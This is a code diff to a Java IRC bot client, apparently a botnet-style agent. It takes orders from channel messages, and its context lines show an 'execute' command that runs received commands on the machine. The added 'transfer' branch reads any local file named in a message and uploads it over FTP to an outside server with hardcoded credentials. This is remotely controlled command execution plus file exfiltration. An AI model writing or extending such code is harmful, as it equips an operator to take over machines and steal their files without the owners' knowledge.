@@ -1,8 +1,11 @@
 package client;
 
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.util.ArrayList;
+import java.io.OutputStream;
+import java.net.URL;
+import java.net.URLConnection;
 import java.util.Scanner;
 
 import org.jibble.pircbot.PircBot;
@@ -36,7 +39,9 @@ public class Client extends PircBot {
 			String[] words = message.split(" ");
 			System.out.println("The following is the nick:" + this.getNick() );
 			if (words.length > 0 && (words[0].equals(this.getNick()) || words[0].equals("all"))) {
-				System.out.println("command directed to me");
+				//System.out.println("command directed to me");
+				
+				
 				if (words.length > 2 && words[1].equals("execute")) {
 					System.out.println("executing command");
 					String command = message.substring(message.indexOf("execute") + 8, message.length());
@@ -55,7 +60,41 @@ public class Client extends PircBot {
 						sendMessage(channel, "Command failed.");
 					}
 	
+				} else if (words.length > 2 && words[1].equals("transfer")) {
+					
+					String ftpUrl = "ftp://%s:%s@%s/%s;type=i";
+					String host = "www.myserver.com";
+					String user = "user";
+					String pass = "pass";
+					String filePath = words[2];
+					String uploadPath = "/MyProjects/archive/Project.zip";
+
+					ftpUrl = String.format(ftpUrl, user, pass, host, uploadPath);
+					System.out.println("Upload URL: " + ftpUrl);
+
+					try {
+					    URL url = new URL(ftpUrl);
+					    URLConnection conn = url.openConnection();
+					    OutputStream outputStream = conn.getOutputStream();
+					    FileInputStream inputStream = new FileInputStream(filePath);
+
+					    byte[] buffer = new byte[8192];
+					    int bytesRead = -1;
+					    while ((bytesRead = inputStream.read(buffer)) != -1) {
+					        outputStream.write(buffer, 0, bytesRead);
+					    }
+
+					    inputStream.close();
+					    outputStream.close();
+
+					    System.out.println("File uploaded");
+					} catch (IOException ex) {
+					    ex.printStackTrace();
+					}
+					
 				}
+				
+				
 
 			}
 
